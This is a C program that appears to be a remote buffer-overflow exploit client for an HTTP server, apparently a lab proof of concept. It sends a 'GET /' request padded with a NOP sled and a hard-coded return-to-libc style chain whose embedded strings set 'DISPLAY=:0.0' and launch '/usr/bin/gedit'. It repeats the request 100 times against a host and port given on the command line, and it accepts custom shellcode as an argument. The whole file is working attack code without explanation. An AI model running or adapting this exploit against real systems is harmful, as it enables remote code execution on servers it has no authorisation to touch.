#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define BUFFER_SIZE 4096

const char default_header[] = " HTTP/1.1\t\n\n";

const char default_shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x21\x2d\xf1\xb7\x44\x49\x53\x50\x6c\xb0\x04\x08\x1f\xd7\xe4\xb7\x21\x2d\xf1\xb7\x4c\x41\x59\x3d\x70\xb0\x04\x08\x1f\xd7\xe4\xb7\x21\x2d\xf1\xb7\x3a\x30\x2e\x30\x74\xb0\x04\x08\x1f\xd7\xe4\xb7\x21\x2d\xf1\xb7\x6c\xb0\x04\x08\x7c\xb0\x04\x08\x1f\xd7\xe4\xb7\x21\x2d\xf1\xb7\x2f\x75\x73\x72\x84\xb0\x04\x08\x1f\xd7\xe4\xb7\x21\x2d\xf1\xb7\x2f\x62\x69\x6e\x88\xb0\x04\x08\x1f\xd7\xe4\xb7\x21\x2d\xf1\xb7\x2f\x67\x65\x64\x8c\xb0\x04\x08\x1f\xd7\xe4\xb7\x21\x2d\xf1\xb7\x69\x74\x61\x61\x90\xb0\x04\x08\x1f\xd7\xe4\xb7\xa5\x41\xe5\xb7\x7b\xdf\xe4\xb7\x01\x01\x01\x01\x78\xb0\x04\x08\xe4\xd5\xea\xb7\xa5\x41\xe5\xb7\x7b\xdf\xe4\xb7\x01\x01\x01\x01\x80\xb0\x04\x08\xe4\xd5\xea\xb7\xa5\x41\xe5\xb7\x7b\xdf\xe4\xb7\x01\x01\x01\x01\x92\xb0\x04\x08\xe4\xd5\xea\xb7\x7b\xdf\xe4\xb7\x01\x01\x01\x01\x7c\xb0\x04\x08\x82\xca\xf1\xb7\x92\xb0\x04\x08\x84\xb0\x04\x08\xa5\x41\xe5\xb7\x28\x84\xf6\xb7\xc5\x8d\xed\xb7";

int main(int argc, char *argv[]) {

    int sockfd, portno, n;
    struct sockaddr_in serv_addr;
    char *serv_host_addr, *page = NULL, *shellcode = NULL;

    if (argc < 3) {
        printf("Host address or port number is missing.\n");
        exit(0);
    }

    serv_host_addr = argv[1];
    portno = atoi(argv[2]);
    if (argv[3] != NULL)
        page = argv[3];
    if (argv[4] != NULL && strncmp(argv[4], "ORBIT_SOCKETDIR", 15) != 0)
        shellcode = argv[4];
    else
        shellcode = argv[4] = NULL;

    char buffer[BUFFER_SIZE];
    int i;

    memset(buffer, '\0', sizeof(buffer));
    memcpy(buffer, "GET /", 5);
    i = 5;
    if (page != NULL) {
        memcpy(buffer + i, page, strlen(page));
        i += strlen(page);
        memcpy(buffer + i, default_header, sizeof(default_header)/sizeof(char));
        i += sizeof(default_header)/sizeof(char);
        printf("Size of packet excluding shellcode: %d\n", i);
        if (shellcode != NULL) {
            memcpy(buffer + i, shellcode, strlen(shellcode));
            i += strlen(shellcode); 
        } else {
            memcpy(buffer + i, default_shellcode, sizeof(default_shellcode)/sizeof(char));
            i += sizeof(default_shellcode)/ sizeof(char);
        }
    } else {
        memcpy(buffer + i, default_header, sizeof(default_header)/sizeof(char));
        i += sizeof(default_header)/sizeof(char);
        printf("Size of packet excluding shellcode: %d\n", i);
        if (shellcode != NULL) {
            memcpy(buffer + i, shellcode, strlen(shellcode));
            i += strlen(shellcode);
        } else {
            memcpy(buffer + i, default_shellcode, sizeof(default_shellcode)/sizeof(char));
            i += sizeof(default_shellcode)/ sizeof(char);
        }
    }

    buffer[++i] = '\0';
    /*printf("buffer len: %d\n", i);
    int j;
    for (j = 0; j < i; j++)
      printf("%c", buffer[i]);
    printf("\n");*/
    int j;
    for (j = 0; j < 100; j++) {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            printf("Can't open stream socket.\n");
            exit(1);
        }
        bzero((char *) &serv_addr,sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = inet_addr(serv_host_addr);
        serv_addr.sin_port = htons(portno);
        if (connect(sockfd,(struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
            printf("Cannot connect to server.\n");
            exit(1);
        }
        n = write(sockfd, buffer, i);
        printf("Write status: %d\n", n);
        if (n < 0) {
            printf("Write error.\n");
            continue;
        }
        
        /*printf("Awaiting response from server..\n");
        bzero(buffer, BUFFER_SIZE);
        n = read(sockfd, buffer, BUFFER_SIZE - 1);
        printf("Read status: %d\n", n);
        if (n < 0) {
            printf("Read error.\n");
            exit(1);
        }
        printf("\n%s\n", buffer);*/

        sleep(1);
    }

    return 0;
}